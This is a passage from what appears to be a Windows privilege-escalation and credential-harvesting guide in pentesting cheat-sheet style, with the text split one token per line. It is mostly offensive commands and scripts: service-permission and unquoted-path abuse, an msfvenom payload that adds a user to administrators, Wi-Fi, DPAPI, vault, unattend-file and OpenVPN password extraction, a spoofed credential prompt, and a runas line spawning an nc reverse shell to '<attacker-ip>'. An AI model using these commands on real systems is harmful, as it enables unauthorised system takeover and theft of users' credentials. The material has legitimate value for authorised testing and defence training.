icacls\n\"%a\"\n2\n>\nnul\n|\nfindstr \"\n(\nM\n)\n(\nF\n)\n:\n\\\n\"\nYou can also use\nsc\nand\nicacls\n:\nsc query\nstate\n=\nall\n|\nfindstr\n\"SERVICE_NAME:\"\n>>\nC:\n\\\nTemp\n\\\nServicenames.txt\nFOR /F\n\"tokens=2 delims= \"\n%i\nin\n(\nC:\n\\\nTemp\n\\\nServicenames.txt\n)\nDO @echo %i\n>>\nC:\n\\\nTemp\n\\\nservices.txt\nFOR /F %i\nin\n(\nC:\n\\\nTemp\n\\\nservices.txt\n)\nDO @sc qc %i\n|\nfindstr\n\"BINARY_PATH_NAME\"\n>>\nC:\n\\\nTemp\n\\\npath.txt\nServices registry modify permissions\nYou should check if you can modify any service registry.\nYou can\ncheck\nyour\npermissions\nover a service\nregistry\ndoing:\nreg query hklm\n\\\nSystem\n\\\nCurrentControlSet\n\\\nServices /s /v imagepath\n#Get the binary paths of the services\n‚Äã\n#Try to write every service with its current content (to check if you have write permissions)\nfor\n/f %a\nin\n(\n'reg query hklm\\system\\currentcontrolset\\services'\n)\ndo\ndel %temp%\n\\\nreg.hiv\n2\n>\nnul\n&\nreg save %a %temp%\n\\\nreg.hiv\n2\n>\nnul\n&&\nreg restore %a %temp%\n\\\nreg.hiv\n2\n>\nnul\n&&\necho\nYou can modify %a\n‚Äã\nget-acl HKLM:\n\\\nSystem\n\\\nCurrentControlSet\n\\\nservices\n\\\n*\n|\nFormat-List *\n|\nfindstr /i\n\"<Username> Users Path Everyone\"\nCheck if\nAuthenticated Users\nor\nNT AUTHORITY\\INTERACTIVE\nhave FullControl. In that case you can change the binary that is going to be executed by the service.\nTo change the Path of the binary executed:\nreg\nadd\nHKLM\n\\\nSYSTEM\n\\\nCurrentControlSet\n\\\nservices\n\\\n<\nservice_name\n>\n/v ImagePath /t REG_EXPAND_SZ /d C:\n\\\npath\n\\\nnew\n\\\nbinary /f\nServices registry AppendData/AddSubdirectory permissions\nIf you have this permission over a registry this means to\nyou can create sub registries from this one\n. In case of Windows services this is\nenough to execute arbitrary code:\nAppendData/AddSubdirectory permission over service registry\nUnquoted Service Paths\nIf the path to an executable is not inside quotes, Windows will try to execute every ending before a space.\nFor example, for the path\nC:\\Program Files\\Some Folder\\Service.exe\nWindows will try to execute:\nC:\\Program.exe\nC:\\Program Files\\Some.exe\nC:\\Program Files\\Some Folder\\Service.exe\nTo list all unquoted service paths (minus built-in Windows services)\nwmic\nservice\nget name,displayname,pathname,startmode\n|\nfindstr /i\n\"Auto\"\n|\nfindstr /i /v\n\"C:\\Windows\n\\\\\n\"\n|\nfindstr /i /v\n\"\"\n\"\nwmic\nservice\nget name,displayname,pathname,startmode\n|\nfindstr /i /v\n\"C:\n\\\\\nWindows\n\\\\\nsystem32\n\\\\\n\"\n|\nfindstr /i /v\n\"\"\n\"\n#Not only auto services\n‚Äã\n#Other way\nfor\n/f\n\"tokens=2\"\n%%n\nin\n(\n'sc query state^= all^| findstr SERVICE_NAME'\n)\ndo\n(\nfor\n/f\n\"delims=: tokens=1*\"\n%%r\nin\n(\n'sc qc \"%%~n\" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:\"c:\\windows\\system32\" ^| findstr /v /c:\"\"\"\"'\n)\ndo\n(\necho\n%%~s\n|\nfindstr /r /c:\n\"[a-Z][ ][a-Z]\"\n>\nnul\n2\n>\n&1\n&&\n(\necho %%n\n&&\necho\n%%~s\n&&\nicacls %%s\n|\nfindstr /i\n\"(F) (M) (W) :\n\\\"\n| findstr /i \"\n:\n\\\\\neveryone authenticated\nusers\ntodos %username%\"\n)\n&&\necho.\n)\n)\ngwmi\n-class\nWin32_Service\n-Property\nName, DisplayName, PathName, StartMode\n|\nWhere\n{\n$_\n.StartMode\n-eq\n\"Auto\"\n-and\n$_\n.PathName\n-notlike\n\"C:\\Windows*\"\n-and\n$_\n.PathName\n-notlike\n'\"*'\n}\n|\nselect\nPathName,DisplayName,Name\nYou can detect and exploit\nthis vulnerability with metasploit:\nexploit/windows/local/trusted_service_path\nYou can manually create a service binary with metasploit:\nmsfvenom\n-p\nwindows/exec\nCMD\n=\n\"net localgroup administrators username /add\"\n-f\nexe-service\n-o\nservice.exe\nRecovery Actions\nIt's possible to indicate Windows what it should do\nwhen executing a service this fails\n. If that setting is pointing a binary and this binary can be overwritten you may be able to escalate privileges.\nApplications\nInstalled Applications\nCheck\npermissions of the binaries\n(maybe you can overwrite one and escalate privileges) and of the\nfolders\n(\nDLL Hijacking\n).\ndir\n/a\n\"C:\\Program Files\"\ndir\n/a\n\"C:\\Program Files (x86)\"\nreg query HKEY_LOCAL_MACHINE\n\\\nSOFTWARE\n‚Äã\nGet-ChildItem\n'C:\\Program Files'\n,\n'C:\\Program Files (x86)'\n|\nft Parent,Name,LastWriteTime\nGet-ChildItem\n-path\nRegistry::HKEY_LOCAL_MACHINE\n\\\nSOFTWARE\n|\nft Name\nWrite Permissions\nCheck if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account (schedtasks).\nA way to find weak folder/files permissions in the system is doing:\naccesschk.exe /accepteula\n# Find all weak folder permissions per drive.\naccesschk.exe\n-uwdqs\nUsers c:\n\\\naccesschk.exe\n-uwdqs\n\"Authenticated Users\"\nc:\n\\\naccesschk.exe\n-uwdqs\n\"Everyone\"\nc:\n\\\n# Find all weak file permissions per drive.\naccesschk.exe\n-uwqs\nUsers c:\n\\\n*.*\naccesschk.exe\n-uwqs\n\"Authenticated Users\"\nc:\n\\\n*.*\naccesschk.exe\n-uwdqs\n\"Everyone\"\nc:\n\\\n*.*\nicacls\n\"C:\\Program Files\\*\"\n2\n>\nnul\n|\nfindstr\n\"(F) (M) :\n\\\"\n| findstr \"\n:\n\\\neveryone authenticated\nusers\ntodos %username%\n\"\nicacls \"\n:\n\\\nProgram Files\n(\nx86\n)\\\n*\n\" 2>nul | findstr \"\n(\nF\n)\n(\nM\n)\nC:\n\\\n\"\n|\nfindstr\n\":\\ everyone authenticated users todos %username%\"\nGet-ChildItem\n'C:\\Program Files\\*'\n,\n'C:\\Program Files (x86)\\*'\n|\n%\n{\ntry\n{\nGet-Acl\n$_\n-EA\nSilentlyContinue\n|\nWhere\n{(\n$_\n.Access\n|\nselect\n-ExpandProperty\nIdentityReference\n)\n-match\n'Everyone'\n}\n}\ncatch\n{}}\n‚Äã\nGet-ChildItem\n'C:\\Program Files\\*'\n,\n'C:\\Program Files (x86)\\*'\n|\n%\n{\ntry\n{\nGet-Acl\n$_\n-EA\nSilentlyContinue\n|\nWhere\n{(\n$_\n.Access\n|\nselect\n-ExpandProperty\nIdentityReference\n)\n-match\n'BUILTIN\\Users'\n}\n}\ncatch\n{}}\nRun at startup\nCheck if you can overwrite some registry or binary that is going to be executed by a different user.\nRead\nthe\nfollowing page\nto learn more about interesting\nautoruns locations to escalate privileges\n:\nPrivilege Escalation with Autoruns\nDrivers\nLook for possible\nthird party weird/vulnerable\ndrivers\ndriverquery\ndriverquery.exe /fo table\ndriverquery /SI\nPATH DLL Hijacking\nIf you have\nwrite permissions inside a folder present on PATH\nyou could be able to hijack a DLL loaded by a process and\nescalate privileges\n.\nCheck permissions of all folders inside PATH:\nfor\n%%A\nin\n(\n\"%path:;=\"\n;\n\"%\"\n)\ndo\n(\ncmd.exe /c icacls\n\"%%~A\"\n2\n>\nnul\n|\nfindstr /i\n\"(F) (M) (W) :\n\\\"\n| findstr /i \"\n:\n\\\\\neveryone authenticated\nusers\ntodos %username%\"\n&&\necho.\n)\nFor more information about how to abuse this check:\nWritable Sys Path +Dll Hijacking Privesc\nNetwork\nShares\nnet view\n#Get a list of computers\nnet view /all /domain\n[\ndomainname\n]\n#Shares on the domains\nnet view\n\\\\\ncomputer /ALL\n#List shares of a computer\nnet use x:\n\\\\\ncomputer\n\\\nshare\n#Mount the share locally\nnet share\n#Check current shares\nhosts file\nCheck for other known computers hardcoded on the hosts file\ntype C:\\Windows\\System32\\drivers\\etc\\hosts\nNetwork Interfaces & DNS\nipconfig /all\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\nGet-DnsClientServerAddress -AddressFamily IPv4 | ft\nOpen Ports\nCheck for\nrestricted services\nfrom the outside\nnetstat\n-ano\n#Opened ports?\nRouting Table\nroute print\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex\nARP Table\narp -A\nGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L\nFirewall Rules\n‚Äã\nCheck this page for Firewall related commands\n(list rules, create rules, turn off, turn off...)\nMore\ncommands for network enumeration here\n‚Äã\nWindows Subsystem for Linux (wsl)\nC:\\Windows\\System32\\bash.exe\nC:\\Windows\\System32\\wsl.exe\nBinary\nbash.exe\ncan also be found in\nC:\\Windows\\WinSxS\\amd64_microsoft-windows-lxssbash_[...]\\bash.exe\nIf you get root user you can listen on any port (the first time you use\nnc.exe\nto listen on a port it will ask via GUI if\nnc\nshould be allowed by the firewall).\nwsl whoami\n./ubuntun1604.exe config --default-user root\nwsl whoami\nwsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'\nTo easily start bash as root, you can try\n--default-user root\nYou can explore the\nWSL\nfilesystem in the folder\nC:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\\LocalState\\rootfs\\\nWindows Credentials\nWinlogon Credentials\nreg query\n\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"\n2\n>\nnul\n|\nfindstr /i\n\"DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername\"\n‚Äã\n#Other way\nreg query\n\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n/v DefaultDomainName\nreg query\n\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n/v DefaultUserName\nreg query\n\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n/v DefaultPassword\nreg query\n\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n/v AltDefaultDomainName\nreg query\n\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n/v AltDefaultUserName\nreg query\n\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n/v AltDefaultPassword\nCredentials manager / Windows vault\nFrom\nhttps://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault\nThe Windows Vault stores user credentials for servers, websites and other programs that\nWindows\ncan\nlog in the users automaticall\ny. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.\nWindows Vault stores credentials that Windows can log in the users automatically, which means that any\nWindows application that needs credentials to access a resource\n(server or a website)\ncan make use of this Credential Manager\n& Windows Vault and use the credentials supplied instead of users entering the username and password all the time.\nUnless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow\ncommunicate with the credential manager and request the credentials for that resource\nfrom the default storage vault.\nUse the\ncmdkey\nto list the stored credentials on the machine.\ncmdkey /list\nCurrently stored credentials:\nTarget: Domain:interactive=WORKGROUP\\Administrator\nType: Domain Password\nUser: WORKGROUP\\Administrator\nThen you can use\nrunas\nwith the\n/savecred\noptions in order to use the saved credentials. The following example is calling a remote binary via an SMB share.\nrunas /savecred /user:WORKGROUP\n\\\nAdministrator\n\"\n\\\\\n10.XXX.XXX.XXX\\SHARE\n\\e\nvil.exe\"\nUsing\nrunas\nwith a provided set of credential.\nC:\n\\\nWindows\n\\\nSystem32\n\\\nrunas.exe /env /noprofile /user:\n<\nusername\n>\n<\npassword\n>\n\"c:\\users\\Public\n\\n\nc.exe -nc <attacker-ip> 4444 -e cmd.exe\"\nNote that mimikatz, lazagne,\ncredentialfileview\n,\nVaultPasswordView\n, or from\nEmpire Powershells module\n.\nDPAPI\nIn theory, the Data Protection API can enable symmetric encryption of any kind of data; in practice, its primary use in the Windows operating system is to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy.\nDPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets\n, or in the case of system encryption, using the system's domain authentication secrets.\nThe DPAPI keys used for encrypting the user's RSA keys are stored under\n%APPDATA%\\Microsoft\\Protect\\{SID}\ndirectory, where {SID} is the\nSecurity Identifier\nof that user.\nThe DPAPI key is stored in the same file as the master key that protects the users private keys\n. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using\ndir\nfrom the cmd, but you can list it from PS).\nGet-ChildItem  C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Protect\\\nGet-ChildItem  C:\\Users\\USER\\AppData\\Local\\Microsoft\\Protect\\\nYou can use\nmimikatz module\ndpapi::masterkey\nwith the appropriate arguments (\n/pvk\nor\n/rpc\n) to decrypt it.\nThe\ncredentials files protected by the master password\nare usually located in:\ndir C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\ndir C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\nYou can use\nmimikatz module\ndpapi::cred\nwith the appropiate\n/masterkey\nto decrypt.\nYou can\nextract many DPAPI\nmasterkeys\nfrom\nmemory\nwith the\nsekurlsa::dpapi\nmodule (if you are root).\nDPAPI - Extracting Passwords\nPowerShell Credentials\nPowerShell credentials\nare often used for\nscripting\nand automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using\nDPAPI\n, which typically means they can only be decrypted by the same user on the same computer they were created on.\nTo\ndecrypt\na PS credentials from the file containing it you can do:\nPS C:\\> $credential = Import-Clixml -Path 'C:\\pass.xml'\nPS C:\\> $credential.GetNetworkCredential().username\n‚Äã\njohn\n‚Äã\nPS C:\\htb> $credential.GetNetworkCredential().password\n‚Äã\nJustAPWD!\nWifi\n#List saved Wifi using\nnetsh wlan show profile\n#To get the clear-text password use\nnetsh wlan show profile\n<\nSSID\n>\nkey\n=\nclear\n#Oneliner to extract all wifi passwords\ncls\n&\necho.\n&\nfor\n/f\n\"tokens=4 delims=: \"\n%a\nin\n(\n'netsh wlan show profiles ^| find \"Profile \"'\n)\ndo\n@echo off\n>\nnul\n&\n(\nnetsh wlan show profiles\nname\n=\n%a\nkey\n=\nclear\n|\nfindstr\n\"SSID Cipher Content\"\n|\nfind\n/v\n\"Number\"\n&\necho.\n)\n&\n@echo on\nSaved RDP Connections\nYou can find them on\nHKEY_USERS\\<SID>\\Software\\Microsoft\\Terminal Server Client\\Servers\\\nand in\nHKCU\\Software\\Microsoft\\Terminal Server Client\\Servers\\\nRecently Run Commands\nHCU\\<SID>\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\nHKCU\\<SID>\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\nRemote Desktop Credential Manager\n%localappdata%\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings\nUse the\nMimikatz\ndpapi::rdg\nmodule with appropriate\n/masterkey\nto\ndecrypt any .rdg files\nYou can\nextract many DPAPI masterkeys\nfrom memory with the Mimikatz\nsekurlsa::dpapi\nmodule\nSticky Notes\nPeople often use the StickyNotes app on Windows workstations to\nsave passwords\nand other information, not realizing it is a database file. This file is located at\nC:\\Users\\<user>\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite\nand is always worth searching for and examining.\nAppCmd.exe\nNote that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.\nAppCmd.exe\nis located in the\n%systemroot%\\system32\\inetsrv\\\ndirectory.\nIf this file exists then it is possible that some\ncredentials\nhave been configured and can be\nrecovered\n.\nThis code was extracted from\nPowerUP\n:\nfunction\nGet-ApplicationHost\n{\n$OrigError\n=\n$ErrorActionPreference\n$ErrorActionPreference\n=\n\"SilentlyContinue\"\n‚Äã\n# Check if appcmd.exe exists\nif\n(\nTest-Path\n(\n\"\n$Env\n:SystemRoot\\System32\\inetsrv\n\\a\nppcmd.exe\"\n))\n{\n# Create data table to house results\n$DataTable\n=\nNew-Object System.Data.DataTable\n‚Äã\n# Create and name columns in the data table\n$Null\n=\n$DataTable\n.Columns.Add\n(\n\"user\"\n)\n$Null\n=\n$DataTable\n.Columns.Add\n(\n\"pass\"\n)\n$Null\n=\n$DataTable\n.Columns.Add\n(\n\"type\"\n)\n$Null\n=\n$DataTable\n.Columns.Add\n(\n\"vdir\"\n)\n$Null\n=\n$DataTable\n.Columns.Add\n(\n\"apppool\"\n)\n‚Äã\n# Get list of application pools\nInvoke-Expression\n\"\n$Env\n:SystemRoot\\System32\\inetsrv\n\\a\nppcmd.exe list apppools /text:name\"\n|\nForEach-Object\n{\n‚Äã\n# Get application pool name\n$PoolName\n=\n$_\n‚Äã\n# Get username\n$PoolUserCmd\n=\n\"\n$Env\n:SystemRoot\\System32\\inetsrv\n\\a\nppcmd.exe list apppool \"\n+\n\"\n`\n\"$PoolName\n`\n\"\n/text:processmodel.username\n\"\n$PoolUser\n= Invoke-Expression\n$PoolUserCmd\n‚Äã\n# Get password\n$PoolPasswordCmd\n= \"\n$Env\n:SystemRoot\n\\\nSystem32\n\\\ninetsrv\n\\\nappcmd.exe list apppool\n\" + \"\n`\n\"$PoolName\n`\n\" /text:processmodel.password\n\"\n$PoolPassword\n= Invoke-Expression\n$PoolPasswordCmd\n‚Äã\n# Check if credentials exists\nif ((\n$PoolPassword\n-ne \"\n\"\n)\n-and\n(\n$PoolPassword\n-isnot\n[\nsystem.array\n]))\n{\n# Add credentials to database\n$Null\n=\n$DataTable\n.Rows.Add\n(\n$PoolUser\n,\n$PoolPassword\n,\n'Application Pool'\n,\n'NA'\n,\n$PoolName\n)\n}\n}\n‚Äã\n# Get list of virtual directories\nInvoke-Expression\n\"\n$Env\n:SystemRoot\\System32\\inetsrv\n\\a\nppcmd.exe list vdir /text:vdir.name\"\n|\nForEach-Object\n{\n‚Äã\n# Get Virtual Directory Name\n$VdirName\n=\n$_\n‚Äã\n# Get username\n$VdirUserCmd\n=\n\"\n$Env\n:SystemRoot\\System32\\inetsrv\n\\a\nppcmd.exe list vdir \"\n+\n\"\n`\n\"$VdirName\n`\n\"\n/text:userName\n\"\n$VdirUser\n= Invoke-Expression\n$VdirUserCmd\n‚Äã\n# Get password\n$VdirPasswordCmd\n= \"\n$Env\n:SystemRoot\n\\\nSystem32\n\\\ninetsrv\n\\\nappcmd.exe list\nvdir\n\" + \"\n`\n\"$VdirName\n`\n\" /text:password\"\n$VdirPassword\n=\nInvoke-Expression\n$VdirPasswordCmd\n‚Äã\n# Check if credentials exists\nif\n((\n$VdirPassword\n-\nne \"\"\n)\n-\nand\n(\n$VdirPassword\n-\nisnot [system.array]\n))\n{\n# Add credentials to database\n$Null\n=\n$DataTable\n.Rows.Add\n(\n$VdirUser\n,\n$VdirPassword\n,\n'Virtual Directory'\n,\n$VdirName\n,\n'NA'\n)\n}\n}\n‚Äã\n# Check if any passwords were found\nif\n(\n$DataTable\n.rows.Count\n-gt\n0\n)\n{\n# Display results in list view that can feed into the pipeline\n$DataTable\n|\nSort-Object type,user,pass,vdir,apppool\n|\nSelect-Object user,pass,type,vdir,apppool\n-Unique\n}\nelse\n{\n# Status user\nWrite-Verbose\n'No application pool or virtual directory passwords were found.'\n$False\n}\n}\nelse\n{\nWrite-Verbose\n'Appcmd.exe does not exist in the default location.'\n$False\n}\n$ErrorActionPreference\n=\n$OrigError\n}\nSCClient / SCCM\nCheck if\nC:\\Windows\\CCM\\SCClient.exe\nexists .\nInstallers are\nrun with SYSTEM privileges\n, many are vulnerable to\nDLL Sideloading (Info from\nhttps://github.com/enjoiz/Privesc\n).\n$result\n=\nGet-WmiObject\n-Namespace\n\"root\n\\c\ncm\n\\c\nlientSDK\"\n-Class\nCCM_Application\n-Property\n*\n|\nselect\nName,SoftwareVersion\nif\n(\n$result\n)\n{\n$result\n}\nelse\n{\nWrite\n\"Not Installed.\"\n}\nFiles and Registry (Credentials)\nPutty Creds\nreg query\n\"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n/s\n|\nfindstr\n\"HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername\"\n#Check the values saved in each session, user/password could be there\nPutty SSH Host Keys\nreg query HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys\\\nSSH keys in registry\nSSH private keys can be stored inside the registry key\nHKCU\\Software\\OpenSSH\\Agent\\Keys\nso you should check if there is anything interesting in there:\nreg query HKEY_CURRENT_USER\\Software\\OpenSSH\\Agent\\Keys\nIf you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using\nhttps://github.com/ropnop/windows_sshagent_extract\n.\nMore information about this technique here:\nhttps://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/\n‚Äã\nIf\nssh-agent\nservice is not running and you want it to automatically start on boot run:\nGet-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service\nIt looks like this technique isn't valid anymore. I tried to create some ssh keys, add them with\nssh-add\nand login via ssh to a machine. The registry HKCU\\Software\\OpenSSH\\Agent\\Keys doesn't exist and procmon didn't identify the use of\ndpapi.dll\nduring the asymmetric key authentication.\nUnattended files\nC:\\Windows\\sysprep\\sysprep.xml\nC:\\Windows\\sysprep\\sysprep.inf\nC:\\Windows\\sysprep.inf\nC:\\Windows\\Panther\\Unattended.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattended.xml\nC:\\Windows\\System32\\Sysprep\\unattend.xml\nC:\\Windows\\System32\\Sysprep\\unattended.xml\nC:\\unattend.txt\nC:\\unattend.inf\ndir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul\nYou can also search for these files using\nmetasploit\n:\npost/windows/gather/enum_unattend\nExample content_:_\n<\ncomponent\nname\n=\n\"\nMicrosoft-Windows-Shell-Setup\n\"\npublicKeyToken\n=\n\"\n31bf3856ad364e35\n\"\nlanguage\n=\n\"\nneutral\n\"\nversionScope\n=\n\"\nnonSxS\n\"\nprocessorArchitecture\n=\n\"\namd64\n\"\n>\n<\nAutoLogon\n>\n<\nPassword\n>\nU2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==\n</\nPassword\n>\n<\nEnabled\n>\ntrue\n</\nEnabled\n>\n<\nUsername\n>\nAdministrateur\n</\nUsername\n>\n</\nAutoLogon\n>\n‚Äã\n<\nUserAccounts\n>\n<\nLocalAccounts\n>\n<\nLocalAccount\nwcm:\naction\n=\n\"\nadd\n\"\n>\n<\nPassword\n>\n*SENSITIVE*DATA*DELETED*\n</\nPassword\n>\n<\nGroup\n>\nadministrators;users\n</\nGroup\n>\n<\nName\n>\nAdministrateur\n</\nName\n>\n</\nLocalAccount\n>\n</\nLocalAccounts\n>\n</\nUserAccounts\n>\nSAM & SYSTEM backups\n# Usually %SYSTEMROOT% = C:\\Windows\n%SYSTEMROOT%\n\\\nrepair\n\\\nSAM\n%SYSTEMROOT%\n\\\nSystem32\n\\\nconfig\n\\\nRegBack\n\\\nSAM\n%SYSTEMROOT%\n\\\nSystem32\n\\\nconfig\n\\\nSAM\n%SYSTEMROOT%\n\\\nrepair\n\\\nsystem\n%SYSTEMROOT%\n\\\nSystem32\n\\\nconfig\n\\\nSYSTEM\n%SYSTEMROOT%\n\\\nSystem32\n\\\nconfig\n\\\nRegBack\n\\\nsystem\nCloud Credentials\n#From user home\n.aws\n\\\ncredentials\nAppData\n\\\nRoaming\n\\\ngcloud\n\\\ncredentials.db\nAppData\n\\\nRoaming\n\\\ngcloud\n\\\nlegacy_credentials\nAppData\n\\\nRoaming\n\\\ngcloud\n\\\naccess_tokens.db\n.azure\n\\\naccessTokens.json\n.azure\n\\\nazureProfile.json\nMcAfee SiteList.xml\nSearch for a file called\nSiteList.xml\nCached GPP Pasword\nBefore KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a custom account. This feature was mainly used to deploy a custom local administrator account on a group of machines. There were two problems with this approach though. First, since the Group Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second problem is that the password set in these GPPs is AES256-encrypted with a default key, which is publicly documented. This means that any authenticated user could potentially access very sensitive data and elevate their privileges on their machine or even the domain. This function will check whether any locally cached GPP file contains a non-empty \"cpassword\" field. If so, it will decrypt it and return a custom PS object containing some information about the GPP along with the location of the file.\nSearch in\nC:\\ProgramData\\Microsoft\\Group Policy\\history\nor in\nC:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Group Policy\\history\n(previous to W Vista)\nfor these files:\nGroups.xml\nServices.xml\nScheduledtasks.xml\nDataSources.xml\nPrinters.xml\nDrives.xml\nTo decrypt the cPassword:\n#To decrypt these passwords you can decrypt it using\ngpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw\nUsing crackmapexec to get the passwords:\ncrackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin\nIIS Web Config\nGet-Childitem ‚ÄìPath C:\n\\\ninetpub\n\\\n-Include\nweb.config\n-File\n-Recurse\n-ErrorAction\nSilentlyContinue\nC:\n\\\nWindows\n\\\nMicrosoft.NET\n\\\nFramework64\n\\\nv4.0.30319\n\\\nConfig\n\\\nweb.config\nC:\n\\\ninetpub\n\\\nwwwroot\n\\\nweb.config\nGet-Childitem ‚ÄìPath C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue\nGet-Childitem ‚ÄìPath C:\\xampp\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue\nExample of web.config with credentials:\n<\nauthentication\nmode\n=\n\"\nForms\n\"\n>\n<\nforms\nname\n=\n\"\nlogin\n\"\nloginUrl\n=\n\"\n/admin\n\"\n>\n<\ncredentials\npasswordFormat\n=\n\"\nClear\n\"\n>\n<\nuser\nname\n=\n\"\nAdministrator\n\"\npassword\n=\n\"\nSuperAdminPassword\n\"\n/>\n</\ncredentials\n>\n</\nforms\n>\n</\nauthentication\n>\nOpenVPN credentials\nAdd\n-\nType\n-\nAssemblyName System\n.\nSecurity\n$keys\n=\nGet\n-\nChildItem\n\"HKCU:\\Software\\OpenVPN-GUI\\configs\"\n$items\n=\n$keys\n|\nForEach\n-\nObject\n{\nGet\n-\nItemProperty $_\n.\nPsPath\n}\n‚Äã\nforeach\n(\n$item\nin\n$items\n)\n{\n$encryptedbytes\n=\n$item\n.\n'auth\n-\ndata'\n$entropy\n=\n$item\n.\n'entropy'\n$entropy\n=\n$entropy\n[\n0\n..\n((\n$entropy\n.\nLength\n)\n-\n2\n)]\n‚Äã\n$decryptedbytes\n=\n[\nSystem\n.\nSecurity\n.\nCryptography\n.\nProtectedData\n]::\nUnprotect\n(\n$encryptedBytes\n,\n$entropy\n,\n[\nSystem\n.\nSecurity\n.\nCryptography\n.\nDataProtectionScope\n]::\nCurrentUser\n)\nWrite\n-\nHost\n([\nSystem\n.\nText\n.\nEncoding\n]::\nUnicode\n.\nGetString\n(\n$decryptedbytes\n))\n}\nLogs\n# IIS\nC:\n\\\ninetpub\n\\\nlogs\n\\\nLogFiles\n\\\n*\n‚Äã\n#Apache\nGet-Childitem ‚ÄìPath C:\n\\\n-Include\naccess.log,error.log\n-File\n-Recurse\n-ErrorAction\nSilentlyContinue\nAsk for credentials\nYou can always\nask the user to enter his credentials of even the credentials of a different user\nif you think he can know them (notice that\nasking\nthe client directly for the\ncredentials\nis really\nrisky\n):\n$cred\n=\n$host\n.ui.promptforcredential\n(\n'Failed Authentication'\n,\n''\n,\n[\nEnvironment\n]\n::UserDomainName+\n'\\'\n+\n[\nEnvironment\n]\n::UserName,\n[\nEnvironment\n]\n::UserDomainName\n);\n$cred\n.getnetworkcredential\n()\n.password\n$cred\n=\n$host\n.ui.promptforcredential\n(\n'Failed Authentication'\n,\n''\n,\n[\nEnvironment\n]\n::UserDomainName+\n'\\'\n+\n'anotherusername'\n,\n[\nEnvironment\n]\n::UserDomainName\n);\n$cred\n.getnetworkcredential\n()\n.password\n‚Äã\n#Get plaintext\n$cred\n.GetNetworkCredential\n()\n|\nfl\nPossible filenames containing credentials\nKnown files that some time ago contained\npasswords\nin\nclear-text\nor\nBase64\n$env\n:APPDATA\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nPSReadLine\n\\\nConsoleHost_history\nvnc.ini, ultravnc.ini, *vnc*\nweb.config\nphp.ini httpd.conf httpd-xampp.conf my.ini my.cnf\n(\nXAMPP, Apache, PHP\n)\nSiteList.xml\n#McAfee\nConsoleHost_history.txt\n#PS-History\n*.gpg\n*.pgp\n*config*.php\nelasticsearch.y*ml\nkibana.y*ml\n*.p12\n*.der\n*.csr\n*.cer\nknown_hosts\nid_rsa\nid_dsa\n*.ovpn\nanaconda-ks.cfg\nhostapd.conf\nrsyncd.conf\ncesi.conf\nsupervisord.conf\ntomcat-users.xml\n*.kdbx\nKeePass.config\nNtds.dit\nSAM\nSYSTEM\nFreeSSHDservice.ini\naccess.log\nerror.log\nserver.xml\nConsoleHost_history.txt\nsetupinfo\nsetupinfo.bak\nkey3.db\n#Firefox\nkey4.db\n#Firefox\nplaces.sqlite\n#Firefox\n\"Login 